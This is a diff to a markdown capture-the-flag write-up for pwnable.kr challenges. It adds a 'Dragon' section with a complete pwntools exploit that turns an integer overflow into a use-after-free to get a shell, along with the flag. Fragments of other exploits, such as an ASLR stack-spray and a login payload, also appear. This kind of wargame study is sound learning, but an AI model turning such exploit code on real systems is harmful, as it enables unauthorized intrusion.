@@ -1,6 +1,6 @@
 #### Simple login
 
-```
+```python
 from pwn import *
 import base64
 payload = pack(0xdeadbeef)+pack(0x804925f)+pack(0x811eb40)
@@ -22,7 +22,7 @@ but i still wonder why we have to use subprocces.Popen(['otp',''],stderr=stdout)
 this prog just executed our argv[0] and it had aslr ON , using execv we can give argv[0] whatever we want , and to bypass aslr
 we <b> spray the stack with environment variable </b>
 
-```
+```python
 import os
 import struct
 
@@ -52,6 +52,58 @@ it was a format string bug , and program asks u to guess a key(random val) ,ther
     
 ##### flag :Have you ever saw an example of utilizing [n] format character?? :(    
     
+#### Dragon 
+This problem was good , it took me 1 day to complete , u have to fight with dragon and if u win u get UAF to exploit , 
+the dragon's power is 2 bytes stored in heap all u have to do is increment it;s power to 128 which is will overflow to 0 
+and then exploit the bug to get the flag 
+```python
+from pwn import * 
+
+#p = process('./dragon')
+
+p = remote('pwnable.kr' ,9004)
+
+
+p.recvlines(4)
+p.sendline('2')
+print "[+] playing with baby dragon"
+p.recvlines(7)
+p.sendline('2')
+p.recvlines(9)
+p.sendline('1')
+print "[+] playing with mama dragon"
+p.recvlines(9)
+for i in range(3):
+        print "[+] Activating Sheild"
+	p.sendline('3')
+	p.recvlines(10)
+	print "[+] Using Sheild"
+	p.sendline('3')
+	p.recvlines(10)
+	print "[+] Using clarity"
+	p.sendline('2')
+	p.recvlines(11)
+
+
+print "[+] Activating Sheild"
+p.sendline('3')
+p.recvlines(10)
+print "[+] Using Sheild"
+p.sendline('3')
+p.recvlines(10)
+print "[+] Using clarity"
+p.sendline('2')
+p.recvuntil(':')
+
+print "[+] Dragon killed !! , we Won !!"
+p.sendline(pack(0x08048dbf))
+p.interactive()
+
+```
+###### flag : MaMa, Gandhi was right! :)
+
+
+
 
 
 
